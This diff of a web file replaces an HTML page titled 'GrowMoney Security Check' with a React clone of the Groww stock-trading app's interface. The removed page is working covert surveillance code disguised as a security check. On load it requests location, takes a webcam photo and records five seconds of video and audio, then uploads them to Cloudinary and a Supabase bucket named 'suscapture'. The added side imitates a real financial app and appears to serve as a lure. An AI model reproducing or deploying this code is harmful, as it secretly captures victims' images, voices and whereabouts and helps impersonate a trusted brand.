@@ -1,117 +1,76 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GrowMoney Security Check</title>
-</head>
-<body>
-    <h1>GrowMoney Security Check</h1>
-    <script type="module">
-        import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
+import { useState } from "react";
+import { Card } from "@/components/ui/card";
+import { Search, LineChart, Wallet, Grid, User } from "lucide-react";
+import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { Button } from "@/components/ui/button";
 
-        const SUPABASE_URL = "https://sadbobgqmepamsjhboad.supabase.co";
-        const SUPABASE_ANON_KEY = "your-anon-key";
-        const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+export default function GrowwClone() {
+  const [selectedTab, setSelectedTab] = useState("stocks");
+  
+  return (
+    <div className="bg-black text-white min-h-screen p-4">
+      {/* Header */}
+      <div className="flex items-center justify-between pb-4">
+        <h2 className="text-lg font-semibold">Stocks</h2>
+        <div className="flex space-x-4">
+          <Search className="w-5 h-5" />
+          <User className="w-5 h-5" />
+        </div>
+      </div>
 
-        const CLOUDINARY_UPLOAD_URL = "https://api.cloudinary.com/v1_1/dxylu8uii/upload";
-        const CLOUDINARY_PRESET = "ml_default";
+      {/* Market Overview */}
+      <div className="grid grid-cols-2 gap-4 pb-4">
+        <Card className="p-2 text-center">
+          <p className="text-sm">NIFTY 50</p>
+          <p className="text-lg font-bold">23,519.35</p>
+          <p className="text-red-500">-72.60 (-0.31%)</p>
+        </Card>
+        <Card className="p-2 text-center">
+          <p className="text-sm">SENSEX</p>
+          <p className="text-lg font-bold">77,414.92</p>
+          <p className="text-red-500">-191.51 (-0.25%)</p>
+        </Card>
+      </div>
 
-        const BACKEND_URL = "https://website-1j51.onrender.com/upload"; // Updated backend URL
+      {/* Navigation Tabs */}
+      <Tabs value={selectedTab} onValueChange={setSelectedTab} className="pb-4">
+        <TabsList className="flex justify-between">
+          <TabsTrigger value="explore">Explore</TabsTrigger>
+          <TabsTrigger value="holdings">Holdings</TabsTrigger>
+          <TabsTrigger value="watchlist">My Watchlist</TabsTrigger>
+        </TabsList>
+      </Tabs>
 
-        let latitude = null;
-        let longitude = null;
+      {/* Most Traded Section */}
+      <h3 className="text-sm text-gray-400 pb-2">Most Traded on Groww</h3>
+      <div className="grid grid-cols-2 gap-4">
+        <Card className="p-2 text-center">
+          <p className="text-sm">Aster DM Healthcare</p>
+          <p className="text-lg font-bold">₹483.50</p>
+          <p className="text-green-500">+30.15 (6.65%)</p>
+        </Card>
+        <Card className="p-2 text-center">
+          <p className="text-sm">Eternal</p>
+          <p className="text-lg font-bold">₹201.70</p>
+          <p className="text-red-500">-4.58 (2.22%)</p>
+        </Card>
+      </div>
 
-        function requestLocationPermission() {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    latitude = position.coords.latitude;
-                    longitude = position.coords.longitude;
-                    console.log("Location:", latitude, longitude);
-                },
-                (error) => console.error("Location permission denied:", error),
-                { enableHighAccuracy: true }
-            );
-        }
-
-        async function captureImage() {
-            try {
-                const video = document.createElement("video");
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext("2d").drawImage(video, 0, 0);
-                
-                video.srcObject.getTracks().forEach(track => track.stop());
-                
-                canvas.toBlob(blob => handleUpload(blob, "image"), "image/jpeg");
-            } catch (error) {
-                console.error("Error capturing image:", error);
-            }
-        }
-
-        async function captureMedia() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                
-                mediaRecorder.ondataavailable = async (event) => {
-                    const file = new Blob([event.data], { type: "video/webm" });
-                    handleUpload(file, "video");
-                };
-                
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000);
-            } catch (error) {
-                console.error("Error capturing media:", error);
-            }
-        }
-
-        async function handleUpload(file, type) {
-            uploadToCloudinary(file, type);
-            uploadToSupabase(file, type);
-        }
-
-        async function uploadToCloudinary(file, resourceType) {
-            const formData = new FormData();
-            formData.append("file", file);
-            formData.append("upload_preset", CLOUDINARY_PRESET);
-            formData.append("resource_type", resourceType);
-            
-            try {
-                const response = await fetch(CLOUDINARY_UPLOAD_URL, {
-                    method: "POST",
-                    body: formData,
-                });
-                const data = await response.json();
-                console.log("Cloudinary URL:", data.secure_url);
-            } catch (error) {
-                console.error("Cloudinary upload error:", error);
-            }
-        }
-
-        async function uploadToSupabase(file, resourceType) {
-            const fileName = `${Date.now()}-${resourceType}.webm`;
-            try {
-                let { data, error } = await supabase.storage.from("suscapture").upload(fileName, file, {
-                    cacheControl: "3600",
-                    upsert: false,
-                    contentType: file.type
-                });
-                if (error) throw error;
-                console.log("Supabase URL:", data.path);
-            } catch (error) {
-                console.error("Supabase upload error:", error);
-            }
-        }
-
-        requestLocationPermission();
-        captureImage();
-        captureMedia();
-    </script>
-</body>
-</html>
+      {/* Bottom Navigation */}
+      <div className="fixed bottom-0 left-0 w-full bg-gray-900 p-2 flex justify-around border-t border-gray-700">
+        <Button variant="ghost">
+          <LineChart className="w-5 h-5" />
+          Stocks
+        </Button>
+        <Button variant="ghost">
+          <Grid className="w-5 h-5" />
+          F&O
+        </Button>
+        <Button variant="ghost">
+          <Wallet className="w-5 h-5" />
+          Mutual Funds
+        </Button>
+      </div>
+    </div>
+  );
+}
